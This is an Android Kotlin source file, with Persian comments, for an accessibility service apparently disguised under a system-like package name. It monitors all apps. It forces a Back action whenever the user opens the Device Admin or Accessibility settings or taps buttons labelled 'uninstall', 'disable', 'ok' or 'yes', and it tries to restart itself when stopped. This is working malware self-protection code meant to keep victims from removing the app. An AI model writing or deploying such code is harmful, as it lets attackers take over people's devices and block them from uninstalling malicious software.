package com.android.seclogupd.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo

class ProtectorService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            packageNames = null // برای مانیتور کردن همه اپ‌ها
            notificationTimeout = 100
        }
        serviceInfo = info
        Log.d("ProtectorService", "AccessibilityService connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val rootNode = rootInActiveWindow ?: return
        // بررسی همه دکمه‌ها و View‌های کلیک‌پذیر
        blockDangerousButtons(rootNode)

        val packageName = event.packageName?.toString() ?: return
        val className = event.className?.toString() ?: return

        // مانیتور کردن تنظیمات یا DeviceAdmin یا Accessibility تنظیمات
        if (packageName.contains("settings", true)) {
            if (className.contains("DeviceAdminAdd") || className.contains("Accessibility")) {
                // تلاش برای غیرفعال کردن یا حذف
                Log.d("ProtectorService", "Suspicious activity detected in $className, closing...")
                performGlobalAction(GLOBAL_ACTION_BACK)
            }
        }
    }
    private fun blockDangerousButtons(node: AccessibilityNodeInfo?) {
        if (node == null) return

        val keywords = listOf("deactivate", "uninstall", "remove", "turn off", "disable", "ok", "yes")

        if (node.isClickable && node.text != null) {
            val text = node.text.toString().lowercase()
            for (keyword in keywords) {
                if (text.contains(keyword)) {
                    Log.d("ProtectorService", "Blocked button: $text")
                    // اجرای عمل Back به جای کلیک
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    return
                }
            }
        }

        // بازگشتی برای بررسی تمام فرزندان
        for (i in 0 until node.childCount) {
            blockDangerousButtons(node.getChild(i))
        }
    }
    override fun onInterrupt() {
        // هیچ کاری نیاز نیست
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("ProtectorService", "AccessibilityService stopped, restarting...")

        // سرویس رو مجدد فعال کن
        val restartIntent = Intent(this, ProtectorService::class.java)
        startService(restartIntent)
    }
}
